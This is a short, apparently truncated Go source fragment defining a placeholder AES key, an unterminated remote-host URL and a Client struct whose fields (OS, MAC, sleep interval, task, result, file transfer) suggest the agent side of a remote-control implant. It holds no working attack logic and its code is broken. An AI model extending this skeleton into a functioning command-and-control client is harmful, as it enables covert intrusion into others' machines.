package mainconst (
	AesKey     = "xxxxxxxxxxxxxxxx" 
	RemoteHost = "http:
)
type Client struct {
	Lan     string `json:"lan"`
	Os      string `json:"os"`
	Mac     string `json:"mac"`
	Status  int    `json:"status"`
	Sleep   int    `json:"sleep"`
	Task    string `json:"task"`
	Result  string `json:"result"`
	FileHex string `json:"filehex"`
	FileLo  string `json:"filelo"`
}
